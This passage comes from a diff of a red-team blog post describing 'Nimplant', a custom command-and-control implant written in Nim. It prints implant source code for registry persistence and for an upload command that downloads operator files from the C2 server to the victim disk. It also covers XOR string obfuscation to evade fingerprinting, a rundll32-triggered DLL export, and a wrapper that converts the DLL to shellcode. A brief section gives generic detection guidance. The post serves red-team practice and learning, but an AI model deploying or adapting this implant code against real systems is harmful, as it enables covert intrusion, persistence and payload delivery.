+</span></span><span style=display:flex><span>    <span style=color:#6ab825;font-weight:700>elif</span> command == <span style=color:#ed9d13>&#34;add&#34;</span>:
+</span></span><span style=display:flex><span>        setUnicodeValue(regPath, key, value, handle)
+</span></span><span style=display:flex><span>        result = <span style=color:#ed9d13>&#34;Successfully set registry value.&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#6ab825;font-weight:700>else</span>:
+</span></span><span style=display:flex><span>        result = <span style=color:#ed9d13>&#34;Unknown reg command. Please use &#39;reg query&#39; or &#39;reg add&#39; followed by the path (and value when adding a key).&#34;</span>
+</span></span></code></pre></div><p>Example usage of this command for &ldquo;persistence&rdquo; (<code>calc.exe</code> ftw) is shown below.</p><p><img src=/images/nimplant-registry.png alt="Nimplant &amp;lsquo;reg&amp;rsquo; command"></p><p><strong>&lsquo;Upload&rsquo; command</strong></p><p>The <code>upload</code> command is interesting because it requires a modification in server behavior. In essence, it is almost the same as the <code>wget</code> command, which downloads a file from a remote source. However, in case of <code>upload</code>, a file is temporarily hosted on the C2 for the implant to download (it is called &ldquo;upload&rdquo; because downloading a file on the implant is &lsquo;uploading&rsquo; it from the operator&rsquo;s perspective).</p><p>Because compiling the native web library with SSL support is wholly broken in Nim, I resorted to using the excellent <a href=https://github.com/treeform/puppy>Puppy</a> library for all web interactions, including C2 traffic and web-based commands like <code>curl</code> or <code>wget</code>. This library which uses the <code>WinHTTP</code> API under the hood, so it should blend in quite well. It also supports transparent Gzip deflation, which is utilized to compress the file in-transit.</p><p>The command is executed in two phases. First, when the <code>upload</code> command is received by the C2 server, it parses the file to upload, GZip-compresses it, and makes it available for download after providing it with a unique ID. This ID is then passed on to the implant along with the <code>upload</code> command, allowing it to find and download the file. Because WinHTTP is used for the transfer, it looks like a regular file download from a networking perspective.</p><p>Because of this, the Nim code is relatively straight-forward. The bulk of it is again parsing parameters and determining the destination on disk, this time with the addition of parsing some settings from the listener configuration.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#6ab825;font-weight:700>import</span> <span style=color:#447fcf;text-decoration:underline>puppy</span>
+</span></span><span style=display:flex><span><span style=color:#6ab825;font-weight:700>from</span> <span style=color:#447fcf;text-decoration:underline>strutils</span> <span style=color:#6ab825;font-weight:700>import</span> join, split
+</span></span><span style=display:flex><span><span style=color:#6ab825;font-weight:700>from</span> <span style=color:#447fcf;text-decoration:underline>os</span> <span style=color:#6ab825;font-weight:700>import</span> getcurrentdir, <span style=color:#a61717;background-color:#e3d2d2>`</span>/<span style=color:#a61717;background-color:#e3d2d2>`</span>
+</span></span><span style=display:flex><span><span style=color:#6ab825;font-weight:700>from</span> <span style=color:#447fcf;text-decoration:underline>..</span>/util/webClient <span style=color:#6ab825;font-weight:700>import</span> <span style=color:#447fcf;text-decoration:underline>Listener</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Upload a file from the C2 server to Nimplant</span>
+</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># From Nimplant&#39;s perspective this is similar to wget, but calling to the C2 server instead</span>
+</span></span><span style=display:flex><span>proc upload*(li : Listener, args : varargs[string]) : string =
+</span></span><span style=display:flex><span>    var 
+</span></span><span style=display:flex><span>        fileId : string
+</span></span><span style=display:flex><span>        fileName : string
+</span></span><span style=display:flex><span>        filePath : string
+</span></span><span style=display:flex><span>        url : string
+</span></span><span style=display:flex><span>        res : string
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		<span style=color:#999;font-style:italic># The command is passed as &#39;upload [localfile] &lt;remotedestination&gt;&#39;</span>
+</span></span><span style=display:flex><span>		<span style=color:#999;font-style:italic># It is however transmitted as &#39;upload [file-identifier] [originalfilename] &lt;remotedestination&gt;&#39;</span>
+</span></span><span style=display:flex><span>    <span style=color:#6ab825;font-weight:700>if</span> args.len == <span style=color:#3677a9>2</span> <span style=color:#6ab825;font-weight:700>and</span> args[<span style=color:#3677a9>0</span>] != <span style=color:#ed9d13>&#34;&#34;</span> <span style=color:#6ab825;font-weight:700>and</span> args[<span style=color:#3677a9>1</span>] != <span style=color:#ed9d13>&#34;&#34;</span>:
+</span></span><span style=display:flex><span>        fileId = args[<span style=color:#3677a9>0</span>]
+</span></span><span style=display:flex><span>        fileName = args[<span style=color:#3677a9>1</span>]
+</span></span><span style=display:flex><span>        filePath = getCurrentDir()/fileName
+</span></span><span style=display:flex><span>    <span style=color:#6ab825;font-weight:700>elif</span> args.len &gt;= <span style=color:#3677a9>3</span>:
+</span></span><span style=display:flex><span>        fileId = args[<span style=color:#3677a9>0</span>]
+</span></span><span style=display:flex><span>        fileName = args[<span style=color:#3677a9>1</span>]
+</span></span><span style=display:flex><span>        filePath = args[<span style=color:#3677a9>2</span> .. ^<span style=color:#3677a9>1</span>].join(<span style=color:#ed9d13>&#34; &#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#6ab825;font-weight:700>else</span>:
+</span></span><span style=display:flex><span>        <span style=color:#999;font-style:italic># Handling of the second argument (filename) is done by the python server</span>
+</span></span><span style=display:flex><span>        result = <span style=color:#ed9d13>&#34;Invalid number of arguments received. Usage: &#39;upload [local file] [optional: remote file]&#39;.&#34;</span>
+</span></span><span style=display:flex><span>        <span style=color:#6ab825;font-weight:700>return</span>
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>		<span style=color:#999;font-style:italic># Parse the staging server from the configuration file</span>
+</span></span><span style=display:flex><span>    url = li.listenerType &amp; <span style=color:#ed9d13>&#34;://&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#6ab825;font-weight:700>if</span> li.listenerHost != <span style=color:#ed9d13>&#34;&#34;</span>:
+</span></span><span style=display:flex><span>        url = url &amp; li.listenerHost
+</span></span><span style=display:flex><span>    <span style=color:#6ab825;font-weight:700>else</span>:
+</span></span><span style=display:flex><span>        url = url &amp; li.listenerIp &amp; <span style=color:#ed9d13>&#34;:&#34;</span> &amp; li.listenerPort
+</span></span><span style=display:flex><span>    url = url &amp; li.taskpath &amp; <span style=color:#ed9d13>&#34;/&#34;</span> &amp; fileId &amp; <span style=color:#ed9d13>&#34;?id=&#34;</span> &amp; li.id
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#999;font-style:italic># Download the file - Puppy will take care of transparent gzip deflation</span>
+</span></span><span style=display:flex><span>    res = fetch(
+</span></span><span style=display:flex><span>            url,
+</span></span><span style=display:flex><span>            headers = @[Header(key: <span style=color:#ed9d13>&#34;User-Agent&#34;</span>, value: li.userAgent)]
+</span></span><span style=display:flex><span>            )
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#6ab825;font-weight:700>if</span> res == <span style=color:#ed9d13>&#34;&#34;</span>:
+</span></span><span style=display:flex><span>        result = <span style=color:#ed9d13>&#34;Something went wrong uploading the file (Nimplant did not receive response from staging server &#39;&#34;</span> &amp; url &amp; <span style=color:#ed9d13>&#34;&#39;).&#34;</span>
+</span></span><span style=display:flex><span>        <span style=color:#6ab825;font-weight:700>return</span>
+</span></span><span style=display:flex><span>    <span style=color:#6ab825;font-weight:700>else</span>:
+</span></span><span style=display:flex><span>        filePath.writeFile(res)
+</span></span><span style=display:flex><span>        result = <span style=color:#ed9d13>&#34;Uploaded file to &#39;&#34;</span> &amp; filePath &amp; <span style=color:#ed9d13>&#34;&#39;.&#34;</span>
+</span></span></code></pre></div><p><strong>Defense Evasion</strong></p><p>As mentioned earlier on in this post, the idea behind Nimplant is to minimize malicious functionality. This includes defense evasion tricks that, when spotted by a defender, reveal the true nature of Nimplant. I did however choose to include a variant of <a href=https://github.com/Yardanico/nim-strenc>nim-strenc</a>, a library that implements a macro that XOR-encodes static strings at compile time. I&rsquo;d recommend to take a look at the code, it&rsquo;s a pretty good example of how powerful compile-time macro&rsquo;s can be in Nim.</p><p>Though this results in a collection of strings that may look suspicious on manual inspection, it has several advantages. First, it hides semi-sensitive string values from prying eyes, unless an analyst is brave enough to open up a debugger. Additionally, the random seeds for XOR-encoding ensure that the fingerprint of Nimplant is different every time it is compiled, even if the same configuration is used. This helps prevent static fingerprinting of the binary by e.g. the MD5 hash of the file. Finally, using XOR does not affect the entropy value of the binary - an important measure for determining if encrypted and potentially malicious content is present in a binary. Overall, this results in a net benefit for Nimplant where some degree of obfuscation is achieved while limiting the amount of suspicious indicators.</p><h3 id=the-wrapper>The Wrapper</h3><p>The last component of Nimplant is a wrapper script that helps users with compiling the appropriate binaries (after correctly configuring the shared <code>config.toml</code> file), and setting up the C2 server. It supports a variety of compilation options, including <code>.exe</code>, <code>.dll</code>, and <code>.bin</code>. The first two are supported natively by Nim, and are implemented through a compile-time flag in the main Nim function, as follows.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>when defined exportDll:
+</span></span><span style=display:flex><span>		<span style=color:#999;font-style:italic># Manually define the NimMain() function for garbage collection (thanks OffensiveNim)</span>
+</span></span><span style=display:flex><span>    proc NimMain() {.cdecl, importc.}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		<span style=color:#999;font-style:italic># Define an exported function that can be used to trigger the DLL</span>
+</span></span><span style=display:flex><span>		<span style=color:#999;font-style:italic># In this example, one would run &#39;rundll32 .\file.dll,Connect&#39; to execute</span>
+</span></span><span style=display:flex><span>    proc Connect(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : <span style=color:#24909d>bool</span> {.stdcall, exportc, dynlib.} =
+</span></span><span style=display:flex><span>        NimMain()
+</span></span><span style=display:flex><span>        runNp()
+</span></span><span style=display:flex><span>        <span style=color:#6ab825;font-weight:700>return</span> true
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#6ab825;font-weight:700>else</span>:
+</span></span><span style=display:flex><span>		<span style=color:#999;font-style:italic># Structure the binary as a regular executable</span>
+</span></span><span style=display:flex><span>    when isMainModule:
+</span></span><span style=display:flex><span>        runNp()
+</span></span></code></pre></div><p>The compilation helper function basically just constructs the Nim compilation command, accounting for any compile-time and cross-compilation flags that may be needed. If position-independent shellcode is requested as an output format (useful when using other shellcode packers, like Nimpackt 😏), the <code>ConvertToShellcode</code> function from the excellent <a href=https://github.com/monoxgas/sRDI/blob/master/Python/ShellcodeRDI.py>ShellcodeRDI.py</a> is used to convert a freshly generated Nim DLL file to shellcode. Though this is a pretty well-documented technique by now that brings some obvious OPSEC risks, it seems to work quite well in the situations that it&rsquo;s needed. The compilation helper function looks like this.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>def compileNim(<span style=color:#24909d>type</span>):
+</span></span><span style=display:flex><span>    <span style=color:#6ab825;font-weight:700>if</span> (<span style=color:#24909d>type</span> == <span style=color:#ed9d13>&#34;exe&#34;</span> or <span style=color:#24909d>type</span> == <span style=color:#ed9d13>&#34;dll&#34;</span>):
+</span></span><span style=display:flex><span>				<span style=color:#999;font-style:italic># Define base compilation command</span>
+</span></span><span style=display:flex><span>        <span style=color:#40ffff>compileCommand</span> = <span style=color:#ed9d13>&#34;nim c --hints:off --warnings:off -d:release -d:strip --opt:size --passc=-flto --passl=-flto --app:gui -o:client/bin/&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#6ab825;font-weight:700>if</span> <span style=color:#24909d>type</span> == <span style=color:#ed9d13>&#34;dll&#34;</span>:
+</span></span><span style=display:flex><span>						<span style=color:#999;font-style:italic># Add flags for DLL compilation</span>
+</span></span><span style=display:flex><span>						<span style=color:#999;font-style:italic># The &#39;-d:exportDll&#39; flag triggers the &#39;when defined&#39; statements shown above</span>
+</span></span><span style=display:flex><span>            <span style=color:#40ffff>compileCommand</span> = compileCommand + <span style=color:#ed9d13>&#34; --app=lib --nomain -d:exportDll&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#6ab825;font-weight:700>if</span> os.name != <span style=color:#ed9d13>&#34;nt&#34;</span>:
+</span></span><span style=display:flex><span>						<span style=color:#999;font-style:italic># Use cross-compilation from Linux using MinGW</span>
+</span></span><span style=display:flex><span>            <span style=color:#40ffff>compileCommand</span> = compileCommand + <span style=color:#ed9d13>&#34; -d=mingw&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#40ffff>compileCommand</span> = compileCommand + <span style=color:#ed9d13>&#34; client/NimPlant.nim&#34;</span>
+</span></span><span style=display:flex><span>        os.system(compileCommand)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#6ab825;font-weight:700>elif</span> (<span style=color:#24909d>type</span> == <span style=color:#ed9d13>&#34;raw&#34;</span>):
+</span></span><span style=display:flex><span>				<span style=color:#999;font-style:italic># Generate PIC from Nim DLL using sRDI</span>
+</span></span><span style=display:flex><span>        <span style=color:#6ab825;font-weight:700>if</span> not os.path.isfile(<span style=color:#ed9d13>&#34;client/bin/NimPlant.dll&#34;</span>):
+</span></span><span style=display:flex><span>            compileNim(<span style=color:#ed9d13>&#34;dll&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#40ffff>dll</span> = open(<span style=color:#ed9d13>&#34;client/bin/NimPlant.dll&#34;</span>, <span style=color:#ed9d13>&#34;rb&#34;</span>).read()
+</span></span><span style=display:flex><span>        <span style=color:#40ffff>shellcode</span> = ConvertToShellcode(dll, HashFunctionName(<span style=color:#ed9d13>&#39;Update&#39;</span>), <span style=color:#40ffff>flags</span>=0x5)
+</span></span><span style=display:flex><span>        with open(<span style=color:#ed9d13>&#34;client/bin/NimPlant.bin&#34;</span>, <span style=color:#ed9d13>&#34;wb&#34;</span>) as f:
+</span></span><span style=display:flex><span>            f.write(shellcode)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#6ab825;font-weight:700>else</span>:
+</span></span><span style=display:flex><span>        print(<span style=color:#ed9d13>&#34;ERROR: Unrecognized compile type.&#34;</span>)
+</span></span></code></pre></div><p>If the user has prepared the binaries that they want, they are ready to start the server. Of course, the same script offers a convenient <code>server</code> flag to launch the server, which will use the same <code>config.toml</code> used to generate the Nimplant files. The operator is now ready for action!</p><p><img src=/images/nimplant-console.png alt="Nimplant Console"></p><h2 id=detection-guidance>Detection Guidance</h2><p>Now, since I&rsquo;m one of those pesky red teamers and Nimplant will be used in red teaming engagements, I cannot share specific IOCs. That would just be shooting myself (and several others) in the foot. However, as I&rsquo;m not all bad, I will try to put on my best blue hat and share some generic detection guidance.</p><p>As with all detection, it is preferable <strong>not</strong> to focus on the detection of specific tools, but rather try to develop generic rules that catch certain techniques. Nimplant is no exception to this, as its techniques for establishing C2 communications and managing commands aren&rsquo;t at all new. As such, if you see an untrusted binary or unusual process calling out to the internet and subsequently executing suspicious commands - that&rsquo;s something to investigate.</p><p>As mentioned, the available functionality of Nimplant is limited to &ldquo;benign&rdquo; operating system features as much as possible. While this decreases the attack surface in a sense, it introduces some limitations for operators. If an operator wants to deploy a Cobalt Strike beacon from Nimplant, for example, they will have to resort to techniques that use this native functionality. This means that classic detections, focusing on for example the filesystem and registry, work well here.</p><p>If you get a hold of a Nimplant binary in some way, it will also carry some indicators. It will obviously point to Nim being used as a programming language, but that&rsquo;s not an indicator on its own. What&rsquo;s more interesting is the function names and (potential) imports in the binary. If you are lucky enough to get a memory dump of a running Nimplant process, try digging for the encryption key. Having this should allow you to prove beyond a shadow of a doubt that you&rsquo;re dealing with something malicious&mldr;</p><p>Obviously I&rsquo;m not a defender, so I probably missed a couple good detection points and pitfalls. If you have any additions (or improvements from an offensive perspective), please do let me know!</p><h2 id=when-open-source>When open source?!</h2><p>As mentioned above, I&rsquo;m very much a fan of open-sourcing tools, including offensive tooling (within limits of reason, of course). Open-sourcing a tool such as Nimplant allows anyone to have a look at your code and potentially contribute to it. That&rsquo;s a good thing, but it also increases the risk of defenders fingerprinting your code to create detections for it. As we still would like to make use of Nimplant in engagements where it isn&rsquo;t immediately detected I am not open-sourcing the tool for the time being. Hopefully I&rsquo;ll be able to do this somewhere in the future, once we got some good use out of it!</p><p>However, Nimplant is in no way new or ground-breaking, and the techniques it uses are all known. If you&rsquo;re interested in tools like this, the resources are out there to start building your own. Not only does this work better for evading defenses, it provides a great learning experience and something to show on your resume. Obviously building your own C2 from scratch isn&rsquo;t a necessity, extending or modifying an existing open-source framework or even playing with the several extension kits for Cobalt Strike can already bring great results.</p><p>If you&rsquo;re stuck on any offensive (Nim) development project don&rsquo;t hesitate to reach out, I&rsquo;m always happy to help (given the purposes of your project are ethical - obviously). In the end, the most important things are to learn, have fun, and help your clients become more secure.</p></div></article><hr><div class=post-info><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg><span class=tag><a href=https://casvancooten.com/tags/nim/>Nim</a></span>
 <span class=tag><a href=https://casvancooten.com/tags/offensive-tooling/>Offensive Tooling</a></span>
-<span class=tag><a href=https://casvancooten.com/tags/hacking/>Hacking</a></span>
-</p>
-<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6A2 2 0 004 4v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
-5230 Words
-</p>
-<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
-25-08-2021
-(Last updated: 22-02-2022)
-</p>
-<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-git-commit"><circle cx="12" cy="12" r="4"/><line x1="1.05" y1="12" x2="7" y2="12"/><line x1="17.01" y1="12" x2="22.96" y2="12"/></svg>
-<a href=7cbc6db5d409b09dcd74dafef99c2761d5bb7cdb target=_blank rel=noopener>7cbc6db</a>
-@ 22-02-2022
-</p>
-</div>
-<div class=pagination>
-<div class=pagination__buttons>
-<span class="button previous">
-<a href=https://casvancooten.com/posts/2021/10/so-you-wanna-hack-a-bank-global-central-bank-paces-certification-review/>
-<span class=button__icon>←</span>
-<span class=button__text>So You Wanna Hack a Bank? 'Global Central Bank' (PACES) Certification Review</span>
-</a>
-</span>
-<span class="button next">
-<a href=https://casvancooten.com/posts/2021/07/operate-like-you-mean-it-red-team-ops-crto-course-review/>
-<span class=button__text>Operate Like You Mean It: 'Red Team Ops' (CRTO) Course Review</span>
-<span class=button__icon>→</span>
-</a>
-</span>
-</div>
-</div>
-</main>
-</div>
-<footer class=footer>
-<div class=footer__inner>
-<div class=footer__content>
-<span><a href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank rel=noopener>CC BY-NC 4.0</a></span>
-<span><a href=https://casvancooten.com/posts/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></span>
-</div>
-</div>
-<div class=footer__inner>
-<div class=footer__content>
-<span><a href=http://gohugo.io>Hugo</a> theme by <a href=https://github.com/rhazdon>rhazdon</a></span>
-</div>
-</div>
-</footer>
-</div>
-<script type=text/javascript src=/bundle.min.599099f1f14b78b657d524b28e10e0c5098e7cd46e9c7aed73d577068a276c3ff1bb234cbf29cb313333e83cf411727b43157c91ce5b809e2ffc81664614608e.js integrity="sha512-WZCZ8fFLeLZX1SSyjhDgxQmOfNRunHrtc9V3BoonbD/xuyNMvynLMTMz6Dz0EXJ7QxV8kc5bgJ4v/IFmRhRgjg=="></script>
-</body>
-</html>
+<span class=tag><a href=https://casvancooten.com/tags/hacking/>Hacking</a></span></p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6A2 2 0 004 4v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>5230 Words</p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>25-08-2021
+(Last updated: 22-02-2022)</p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-git-commit"><circle cx="12" cy="12" r="4"/><line x1="1.05" y1="12" x2="7" y2="12"/><line x1="17.01" y1="12" x2="22.96" y2="12"/></svg><a href=7cbc6db5d409b09dcd74dafef99c2761d5bb7cdb target=_blank rel=noopener>7cbc6db</a>
+@ 22-02-2022</p></div><div class=pagination><div class=pagination__buttons><span class="button previous"><a href=https://casvancooten.com/posts/2021/10/so-you-wanna-hack-a-bank-global-central-bank-paces-certification-review/><span class=button__icon>←</span>
+<span class=button__text>So You Wanna Hack a Bank? 'Global Central Bank' (PACES) Certification Review</span></a></span>
+<span class="button next"><a href=https://casvancooten.com/posts/2021/07/operate-like-you-mean-it-red-team-ops-crto-course-review/><span class=button__text>Operate Like You Mean It: 'Red Team Ops' (CRTO) Course Review</span>
+<span class=button__icon>→</span></a></span></div></div></main></div><footer class=footer><div class=footer__inner><div class=footer__content><span><a href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank rel=noopener>CC BY-NC 4.0</a></span>
+<span><a href=https://casvancooten.com/posts/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></span></div></div><div class=footer__inner><div class=footer__content><span><a href=http://gohugo.io>Hugo</a> theme by <a href=https://github.com/rhazdon>rhazdon</a></span></div></div></footer></div><script type=text/javascript src=/bundle.min.0d9c31253cf2c389efe69db18027311336d72d858d5c42c8018fc437c9348f7939ddecbf24c5314aae3cf27848ab85486ec36de6b8b134495c1346f9774cdd48.js integrity="sha512-DZwxJTzyw4nv5p2xgCcxEzbXLYWNXELIAY/EN8k0j3k53ey/JMUxSq488nhIq4VIbsNt5rixNElcE0b5d0zdSA=="></script></body></html>
